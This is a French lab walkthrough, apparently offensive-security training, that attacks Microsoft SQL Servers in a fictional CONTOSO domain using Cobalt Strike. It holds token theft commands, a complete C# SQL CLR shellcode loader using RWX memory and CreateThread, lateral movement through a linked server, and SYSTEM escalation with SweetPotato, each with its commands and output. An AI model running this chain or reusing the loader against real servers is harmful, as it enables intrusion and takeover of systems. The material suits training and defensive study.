# Lab — Microsoft SQL Servers

> **Objectif :** étudier l’exécution de code, le Lateral Movement et la Privilege Escalation sur les serveurs Microsoft SQL de l’environnement CONTOSO.

> **Parcours du lab :** énumérer les serveurs SQL dans AD → identifier les groupes `sysadmin` → étudier l’impersonation Kerberos → activer SQL CLR → charger une assembly .NET → rejoindre un second serveur via Linked Server → examiner `SeImpersonatePrivilege`.

---

## Énumération

> ⚠️ **Contexte des Beacons utilisés dans ce lab :**
> - `[BEACON: wkstn-1 | USER: pchilds]` — Beacon initial de moyenne intégrité
> - `[BEACON: wkstn-1 | USER: rsteel]` — même Beacon après l’utilisation du token du processus `rsteel`
> - `[BEACON: lon-db-1 | USER: mssql_svc]` — Beacon CLR dans le processus `sqlservr.exe` de `lon-db-1`
> - `[BEACON: lon-db-2 | USER: mssql_svc]` — Beacon CLR dans le processus `sqlservr.exe` de `lon-db-2`
> - `[BEACON: lon-db-2 | USER: SYSTEM]` — Beacon tcp-local après Privilege Escalation dans le lab

**But de cette phase :** identifier les instances SQL, leurs méthodes d’authentification et les permissions du compte courant avant toute opération.

1. Lancer Cobalt Strike et se connecter au team server.

2. Charger le script Aggressor SQL-BOF.❗ 
    - Ouvrir **Cobalt Strike > Script Manager**
    - Cliquer sur **Load**
    - Sélectionner `C:\Tools\SQL-BOF\SQL\SQL.cna` 

    > **Pourquoi :** SQL-BOF ajoute les commandes `sql-*` sous forme de Beacon Object Files. Ces commandes s’exécutent dans le contexte du Beacon, mais leur classification OPSEC dépend également de la requête SQL effectuée.

3. **BEACON: User** — 🔍 Rechercher les serveurs MS SQL disposant d’une configuration Kerberos.

```
ldapsearch (&(samAccountType=805306368)(servicePrincipalName=MSSQLSvc*)) --attributes name,samAccountName,servicePrincipalName
```

4. **BEACON: User** — 🔍 Consulter les informations de `lon-db-1` et les privilèges du compte courant :

```
sql-info lon-db-1
sql-whoami lon-db-1
```

    > **Utilité :** `sql-info` présente l’instance, son mode d’authentification et les Linked Servers ; `sql-whoami` indique l’identité et le rôle SQL du compte.  
    > `OPSEC-🟢SAFE` dans les notes — exécution via SQL-BOF sans processus enfant.

    > **Résultat attendu :** `pchilds` dispose ici des rôles `public/guest`, sans droits `sysadmin`. Les opérations nécessitant des privilèges élevés ne sont donc pas disponibles.

5. **BEACON: User** — Rechercher les groupes associés au rôle `sysadmin` sur SQL Server.

```
ldapsearch (&(samAccountType=268435456)(|(name=*SQL*)(name=*DB*)(name=*Database*))) --attributes distinguishedName,member
```

> **Résultat du lab :** le groupe `CN=Database Admins` contient `CN=Robert Steel` (`rsteel`).


6. **BEACON: SYSTEM** — Examiner le contexte d’impersonation de `rsteel` pour accéder au rôle `sysadmin` de `lon-db-1`.

    > **Explication :** dans ce lab, `rsteel` dispose du rôle `sysadmin` sur `lon-db-1`. L’identité Windows utilisée pour la connexion SQL détermine les permissions accordées.

    **Vérifier d’abord les tickets Kerberos et les processus appartenant à `rsteel` :**

    ```
    krb_triage
    process_browser
    ```

    > `krb_triage` recense les tickets Kerberos accessibles ; rechercher le TGT de `rsteel` associé au service `krbtgt`.  
    > `process_browser` affiche les processus et leurs propriétaires ; rechercher ceux qui appartiennent à `rsteel`.  
    > `OPSEC-🟢SAFE` dans les notes — opérations BOF sans lancement de processus enfant.

    **Examiner l’utilisation du token d’un processus appartenant à `rsteel` :**

```
steal_token <pid of rsteel cmd process>
```

    > Remplacer `<pid>` par le PID du processus `rsteel` identifié avec `process_browser`.  
    > `steal_token` permet au Beacon d’utiliser le token Windows d’un autre processus, ce qui peut modifier l’identité employée pour certaines connexions réseau.  
    > `OPSEC-🟢SAFE` dans les notes — manipulation du token sans création de processus enfant.


7. **BEACON: SYSTEM - rsteel** — Vérifier le rôle `sysadmin` sur `lon-db-1`.

```
sql-whoami lon-db-1
```
>Le lab poursuit avec la configuration CLR et les assemblies SQL, sous réserve des droits obtenus.  


<img src="/images/sql-server-impersonate-user-rsteel-sysadmin.png">  

## Exécution de code avec SQL CLR

**Objectif :** comprendre le fonctionnement de SQL CLR, qui permet d’exécuter une assembly .NET dans le contexte du processus SQL Server. Son activité demeure observable et dépend de la configuration du serveur.

1. **BEACON: SYSTEM - rsteel** — Vérifier l’état de SQL CLR.

```
sql-query lon-db-1 "SELECT value FROM sys.configurations WHERE name = 'clr enabled'"
```

    > **Explication :** vérifier l’état de CLR permet de déterminer si une modification de configuration est nécessaire, et de la documenter.  
    > `OPSEC-🟠CAUTION` — les requêtes sur `sys.configurations` peuvent être consignées si l’audit SQL est actif.  
    > **Résultat attendu :** `0` signifie désactivé.

2. **BEACON: SYSTEM - rsteel** — Activer SQL CLR sur `lon-db-1`.

```
sql-enableclr lon-db-1
```

    > **Explication :** ce réglage active l’intégration CLR sur l’instance SQL Server, lorsque les autorisations nécessaires sont réunies.  
    > `OPSEC-🟠CAUTION` — la modification de configuration peut être enregistrée dans les journaux SQL Server.

3. Générer le payload SMB x64 prévu par le lab.

    1. **Payloads > Windows Stageless Payload**
    2. Listener : **smb**
    3. Format de sortie : **Raw**
    4. Fonction de sortie : **Thread**
    5. x64: ✓
    6. Cliquer sur **Generate**
    7. Enregistrer dans `C:\Payloads\smb_x64.xthread.bin`


<img src="/images/sql-server-stageless-payload-smb-raw-thread-bin.png">  

    > **Listener SMB :** le lab utilise les named pipes SMB pour communiquer avec un Beacon lorsque la machine ne dispose pas d’accès direct au team server.  
    > **Format Raw :** le fichier binaire est intégré comme ressource dans l’assembly CLR.  
    > **Fonction de sortie :** l’option `Thread` termine le thread associé ; `Process` pourrait arrêter le processus SQL Server lui-même.

4. Dans Visual Studio, créer un projet `Class Library (.NET Framework)` :
    1. Nom du projet : `MyProcedure`
    2. Enregistrer dans le même dossier : ✓
    3. Framework: .NET Framework 4.7.2

    > **.NET Framework** SQL Server's CLR runtime only supports .NET Framework assemblies❗   

5. Ajouter `smb_x64.xthread.bin` comme ressource intégrée.

    > Dans Solution Explorer : clic droit sur le projet → Add → Existing Item → choisir le fichier `.bin`  
    > Sélectionner le fichier → Properties → **Build Action: Embedded Resource**  
    > **Ressource intégrée :** le contenu du fichier binaire est stocké dans la DLL et accessible lors de son chargement.

6. Insérer le code du lab dans `Class1.cs` :

```c#
using System;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using Microsoft.SqlServer.Server;

public partial class StoredProcedures
{
    [SqlProcedure]
    public static void MyProcedure()
    {
        var assembly = Assembly.GetExecutingAssembly();

        byte[] shellcode;

        // Lire le payload intégré : le nom doit correspondre à <AssemblyName>.<filename>
        using (var rs = assembly.GetManifestResourceStream("MyProcedure.smb_x64.xthread.bin"))
        {
            using (var ms = new MemoryStream())
            {
                rs.CopyTo(ms);
                shellcode = ms.ToArray();
            }
        }

        // Allouer la mémoire RWX dans sqlservr.exe
        var hMemory = VirtualAlloc(
            IntPtr.Zero,
            (uint)shellcode.Length,
            VIRTUAL_ALLOCATION_TYPE.MEM_COMMIT | VIRTUAL_ALLOCATION_TYPE.MEM_RESERVE,
            PAGE_PROTECTION_FLAGS.PAGE_EXECUTE_READWRITE);

        // Copier les octets du payload dans la mémoire allouée
        WriteProcessMemory(
            new IntPtr(-1),
            hMemory,
            shellcode,
            (uint)shellcode.Length,
            out _);

        // Exécuter le payload dans un nouveau thread
        var hThread = CreateThread(
            IntPtr.Zero,
            0,
            hMemory,
            IntPtr.Zero,
            THREAD_CREATION_FLAGS.THREAD_CREATE_RUN_IMMEDIATELY,
            out _);

        // Fermer le handle ; le thread continue son exécution
        CloseHandle(hThread);
    }

    [DllImport("KERNEL32.dll", ExactSpelling = true, SetLastError = true)]
    [DefaultDllImportSearchPaths(DllImportSearchPath.System32)]
    public static extern IntPtr VirtualAlloc(
        IntPtr lpAddress,
        uint dwSize,
        VIRTUAL_ALLOCATION_TYPE flAllocationType,
        PAGE_PROTECTION_FLAGS flProtect);

    [DllImport("KERNEL32.dll", ExactSpelling = true, SetLastError = true)]
    [DefaultDllImportSearchPaths(DllImportSearchPath.System32)]
    public static extern bool WriteProcessMemory(
        IntPtr hProcess,
        IntPtr lpBaseAddress,
        byte[] lpBuffer,
        uint nSize,
        out uint lpNumberOfBytesWritten);

    [DllImport("KERNEL32.dll", ExactSpelling = true, SetLastError = true)]
    [DefaultDllImportSearchPaths(DllImportSearchPath.System32)]
    public static extern IntPtr CreateThread(
        IntPtr lpThreadAttributes,
        uint dwStackSize,
        IntPtr lpStartAddress,
        IntPtr lpParameter,
        THREAD_CREATION_FLAGS dwCreationFlags,
        out uint lpThreadId);

    [DllImport("KERNEL32.dll", ExactSpelling = true, SetLastError = true)]
    [DefaultDllImportSearchPaths(DllImportSearchPath.System32)]
    public static extern bool CloseHandle(IntPtr hObject);

    [Flags]
    public enum VIRTUAL_ALLOCATION_TYPE : uint
    {
        MEM_COMMIT = 0x00001000,
        MEM_RESERVE = 0x00002000,
        MEM_RESET = 0x00080000,
        MEM_RESET_UNDO = 0x01000000,
        MEM_REPLACE_PLACEHOLDER = 0x00004000,
        MEM_LARGE_PAGES = 0x20000000,
        MEM_RESERVE_PLACEHOLDER = 0x00040000,
        MEM_FREE = 0x00010000,
    }

    [Flags]
    public enum PAGE_PROTECTION_FLAGS : uint
    {
        PAGE_NOACCESS = 0x00000001,
        PAGE_READONLY = 0x00000002,
        PAGE_READWRITE = 0x00000004,
        PAGE_WRITECOPY = 0x00000008,
        PAGE_EXECUTE = 0x00000010,
        PAGE_EXECUTE_READ = 0x00000020,
        PAGE_EXECUTE_READWRITE = 0x00000040,
        PAGE_EXECUTE_WRITECOPY = 0x00000080,
        PAGE_GUARD = 0x00000100,
        PAGE_NOCACHE = 0x00000200,
        PAGE_WRITECOMBINE = 0x00000400,
    }

    [Flags]
    public enum THREAD_CREATION_FLAGS : uint
    {
        THREAD_CREATE_RUN_IMMEDIATELY = 0x00000000,
        THREAD_CREATE_SUSPENDED = 0x00000004,
        STACK_SIZE_PARAM_IS_A_RESERVATION = 0x00010000,
    }
}
```

    > **Fonctionnement :** lorsque SQL Server invoque `MyProcedure` comme procédure stockée :
    > 1. Lit les données `.bin` depuis les ressources de la DLL.
    > 2. Alloue une zone mémoire RWX dans `sqlservr.exe`.
    > 3. Copie les octets du payload dans cette zone.
    > 4. Démarre un thread qui exécute le payload SMB.
    > 5. Ferme le handle du thread ; son exécution peut se poursuivre indépendamment.
    >
    > Le Beacon fonctionne dans le processus `sqlservr.exe`, sans créer de processus enfant.  
    > `OPSEC-🟠CAUTION` — l’allocation `PAGE_EXECUTE_READWRITE` peut être surveillée par les EDR. La classification OPSEC du lab ne garantit pas l’absence de détection.  
    >
    > **Important :** le nom fourni à `GetManifestResourceStream("MyProcedure.smb_x64.xthread.bin")` doit correspondre exactement au format `<NomProjet>.<NomFichier>`. Une erreur renvoie `null` et empêche la procédure de fonctionner.

    Compiler le projet : **Build → Build Solution** (Release mode)  
    Format de sortie : `C:\Users\Attacker\source\repos\MyProcedure\bin\Release\MyProcedure.dll`


<img src="/images/sql-server-MyProcedure-visual-studio-code-build-release.png">  

7. **BEACON SYSTEM - rsteel** — Charger l’assembly CLR sur `lon-db-1` et exécuter la procédure stockée.

```
sql-clr lon-db-1 C:\Users\Attacker\source\repos\MyProcedure\bin\Release\MyProcedure.dll MyProcedure
```

    > **Rôle de SQL-BOF :** le module charge la DLL sur SQL Server, ajuste les paramètres requis du lab, enregistre l’assembly CLR et exécute la procédure stockée `MyProcedure`.  
    > `OPSEC-🟠CAUTION` — une modification de `TRUSTWORTHY` et l’enregistrement de l’assembly peuvent laisser des traces dans SQL Server, notamment dans `sys.assemblies`.  
    > Dans ce scénario, le Beacon s’exécute dans `sqlservr.exe` sur `lon-db-1` sous le compte de service SQL.

8. **BEACON SYSTEM - rsteel** — Établir la connexion avec le Beacon de `lon-db-1`.

    > **Pourquoi `link` ?** Ce Beacon SMB utilise une named pipe et attend une connexion depuis un autre Beacon ayant accès à `lon-db-1`. Cette liaison construit le tunnel : `CS Team Server → Beacon initial → named pipe SMB → Beacon SQL`.

    > **Prérequis CIFS :** l’accès à la named pipe SMB nécessite une authentification adaptée. En l’absence de ticket ou d’autorisations suffisantes, `ERROR_LOGON_FAILURE` peut apparaître.

    **Méthode du lab — lancer `link` depuis le Beacon `pchilds` :**

    Depuis le Beacon initial de moyenne intégrité de `pchilds` :

```
link lon-db-1 TSVCPIPE-4b2f70b3-ceba-42a5-a4b5-704e1c41337
```

    > `OPSEC-🟢SAFE` dans ces notes — Windows peut utiliser le contexte Kerberos de `pchilds` pour obtenir le ticket de service CIFS nécessaire.  
    > Le nom `TSVCPIPE` est défini dans le listener SMB de Cobalt Strike ; la touche TAB peut faciliter sa saisie.  
    > Dans le scénario, cette commande part du Beacon `pchilds`, dont la session possède le contexte d’authentification attendu.



9. **BEACON SYSTEM - rsteel** — Désactiver SQL CLR sur `lon-db-1` après la connexion du Beacon.

```
sql-disableclr lon-db-1
```

    > **Explication :** rétablir l’état initial de CLR fait partie du nettoyage du lab et réduit les modifications de configuration persistantes.  
    > `OPSEC-🟢SAFE` dans les notes — retour à la configuration initiale.

<img src="/images/sql-server-load-DLL-link-beacon-cleanup.png">  

## Lateral Movement via Linked Server

**Contexte :** `lon-db-1` possède un Linked Server vers `lon-db-2`. L’identité Windows transmise détermine les droits SQL sur la seconde instance. Dans le lab, `rsteel` est `sysadmin` sur les deux serveurs, contrairement à `mssql_svc`.

---

1. **BEACON - SYSTEM rsteel** — Confirmer l’identité `rsteel`, puis lister les Linked Servers de `lon-db-1`.

```cs
getuid    // must show CONTOSO\rsteel — re-run steal_token <rsteel-pid> if not
sql-links lon-db-1
```

2. **BEACON - SYSTEM rsteel** — Vérifier que `rsteel` possède le rôle `sysadmin` sur `lon-db-2` via le lien.

```cs
sql-whoami lon-db-1 "" lon-db-2
```

    > ⚠️  Résultat attendu sous `rsteel` : `sysadmin role` on lon-db-2.

3. **BEACON wkstn-1 SYSTEM rsteel** — Vérifier l’état de RPC Out sur le Linked Server.

```cs
sql-checkrpc lon-db-1
```

    > Résultat attendu : `LON-DB-2 | is_rpc_out_enabled: 0` — ce paramètre doit être activé pour le scénario CLR du lab.

4. **BEACON wkstn-1 SYSTEM rsteel** — Activer RPC Out sur le lien vers `lon-db-2`.

```cs
sql-enablerpc lon-db-1 lon-db-2
```

> OPSEC-🟠CAUTION — la modification du Linked Server peut être enregistrée dans SQL Server et visible dans `sys.servers`.

<img src="/images/sql-server-lateral-movement-enable-RPC-link.png">  


5. **BEACON 💻wkstn-1 ❗ SYSTEM  CONTOSO\rsteel💡** — Exécuter le payload SQL CLR sur `lon-db-2` via `lon-db-1` dans le lab.

```cs
sql-clr lon-db-1 C:\Users\Attacker\source\repos\MyProcedure\bin\Release\MyProcedure.dll MyProcedure "" lon-db-2
```

    > ⚠️   SQL-BOF utilise l’identité Windows du Beacon. Le contexte `mssql_svc` n’a pas les droits nécessaires sur `lon-db-2` et peut déclencher l’erreur `42000`. Dans ce lab, `rsteel` possède le rôle SQL requis sur les deux instances.


    > Vérifier l’apparition du Beacon dans le processus `sqlservr.exe` de `lon-db-2` avant la connexion.
    > OPSEC-🟠CAUTION — les changements `TRUSTWORTHY` et l’enregistrement CLR peuvent être journalisés sur `lon-db-2`.  
    

<img src="/images/sql-server-sql-clr-lon-db-1-MyProcedure-dll-lon-db-2.png">  


6. **BEACON 💻lon-db-1 ❗ mssql_svc** — Établir la connexion avec le Beacon de `lon-db-2`.

    Depuis le **Beacon CLR de `lon-db-1`** :

```cs
link lon-db-2 <smb-listener-pipe-name>
```

> ⚠️ Dans le lab, `lon-db-2` se situe sur un segment réseau séparé. La liaison SMB part donc du Beacon de `lon-db-1`, qui dispose de la connectivité prévue vers le second serveur.  

> Cette connexion forme la chaîne : `CS Team Server ↔ wkstn-1 beacon ↔ lon-db-1 SMB beacon ↔ lon-db-2 SMB beacon`.
`[+] established link to child beacon: 10.10.120.25`
> OPSEC-🟢SAFE dans ces notes — connexion via une named pipe SMB.  

7. **BEACON 💻 wkstn-1 ❗SYSTEM  CONSTOSO\rsteel - admin** — Désactiver RPC Out après l’établissement de la liaison.

```cs
sql-disablerpc lon-db-1 lon-db-2
```

    > Nettoyage — remettre RPC Out dans son état initial pour éviter de laisser une modification de configuration.

---

> ⚠️ **Erreur fréquente :** lancer `sql-clr` depuis le contexte `mssql_svc` de `lon-db-1` peut provoquer l’erreur de permission `42000` sur `lon-db-2`. Le lab indique que l’assembly peut laisser une entrée résiduelle dans `sys.trusted_assemblies`.

---

## Privilege Escalation via SeImpersonatePrivilege

**Contexte :** le Beacon de `lon-db-2` utilise le compte de service SQL. Le lab étudie les conséquences de la présence du privilège `SeImpersonatePrivilege` et la possibilité d’accéder à un contexte SYSTEM.

1. Sélectionner le **Beacon CLR de `lon-db-2`** dans Cobalt Strike.

2. **BEACON: lon-db-2 USER: mssql_svc** — Vérifier l’identité du compte de service.

```    
getuid
whoami
```

    > Résultat présenté dans le lab : `CONTOSO\mssql_svc`. L’utilisation de SweetPotato dépend de la présence effective de `SeImpersonatePrivilege` ; ne pas supposer que ce droit existe sur toutes les configurations.

    > **Résultat attendu :** `NT Service\MSSQLSERVER` (or similar SQL service account).  
    > La sortie du lab indique `SeImpersonatePrivilege: Enabled`.  
    > **Pourquoi vérifier :** ce privilège fait partie des prérequis étudiés dans les techniques de la famille Potato. Son existence seule ne garantit pas leur réussite.

3. Générer le payload TCP local du lab.

    1. **Payloads > Windows Stageless Payload**
    2. Listener : **tcp-local**
    3. Format de sortie : Windows Executable
    4. Fonction de sortie : Process
    5. x64: ✓
    6. Cliquer sur **Generate**
    7. Enregistrer dans `C:\Payloads\tcp-local_x64.exe`

    > **Pourquoi `tcp-local` :** dans le scénario, `lon-db-2` ne possède pas de connexion sortante directe vers le team server. Le listener `tcp-local` fonctionne sur `127.0.0.1` et s’utilise depuis la machine elle-même.  
    > **Pourquoi la sortie Process :** le programme peut se terminer après la création de la session prévue dans le lab.

<img src="/images/sql-server-privilege-escalation-tcp-local-payload.png">  

4. **BEACON: lon-db-2 USER: mssql_svc** — Se placer dans le répertoire de profil du compte de service MSSQL utilisé dans le lab.

```
cd C:\Windows\ServiceProfiles\MSSQLSERVER\AppData\Local\Microsoft\WindowsApps
```

5. **BEACON: lon-db-2  USER: mssql_svc** — Transférer le payload tcp-local dans l’environnement du lab.

```
upload C:\Payloads\tcp-local_x64.exe
```

> `OPSEC-🟠CAUTION` — écriture sur disque, susceptible de déclencher une détection Microsoft Defender. 🟠Custom artifact required in exam.

6. **BEACON: lon-db-2  USER: mssql_svc** — Étudier l’exécution du payload via SweetPotato et `SeImpersonatePrivilege` `OPSEC-🟠CAUTION`.

```
execute-assembly C:\Tools\SweetPotato\bin\Release\SweetPotato.exe -p "C:\Windows\ServiceProfiles\MSSQLSERVER\AppData\Local\Microsoft\WindowsApps\tcp-local_x64.exe"
```

    **Méthode PrintSpoofer** (impersonation de named pipe avec `-i`) :
    > ```
    > [+] Triggering notification on evil PIPE \\lon-db-2/pipe/...
    > [+] Server connected to our evil RPC pipe
    > [+] Duplicated impersonation token ready for process creation
    > [+] Intercepted and authenticated successfully, launching program
    > [+] Process created, enjoy!
    > ```

    > **SweetPotato**
    > 1. Crée un serveur COM de test sur la machine locale.
    > 2. Déclenche une authentification DCOM d’un service Windows privilégié vers ce serveur.
    > 3. Utilise `SeImpersonatePrivilege` dans le scénario pour obtenir un token privilégié.
    > 4. Appelle `CreateProcessWithTokenW` afin de lancer le programme avec ce token.
    >
    > Résultat : `tcp-local_x64.exe` runs as `NT AUTHORITY\SYSTEM`.  
    > `OPSEC-🟠CAUTION` — `execute-assembly` utilise le mécanisme fork-and-run, susceptible d’être détecté et journalisé.

7. **BEACON: lon-db-2 USER: mssql_svc** — Se connecter au nouveau Beacon SYSTEM du lab.

```
connect localhost 1337
```

    > Résultat présenté dans le lab : `[+] established link to child beacon: 10.10.120.25` → `NT AUTHORITY\SYSTEM` sur lon-db-2.

    > **localhost :** le Beacon tcp-local écoute sur `127.0.0.1:1337` dans `lon-db-2`. La connexion s’effectue depuis un autre Beacon du même hôte.  
    > `OPSEC-🟢SAFE` dans les notes — connexion locale TCP loopback.  
    > Le port `1337` est défini dans la configuration du listener `tcp-local`.

> **Fin du lab :** énumération SQL par LDAP, étude de l’identité Kerberos, exécution SQL CLR, Linked Servers entre segments réseau et vérification de la Privilege Escalation liée à `SeImpersonatePrivilege`.

<img src="/images/sql-servers-linked-lab-final-view.png" width=860>
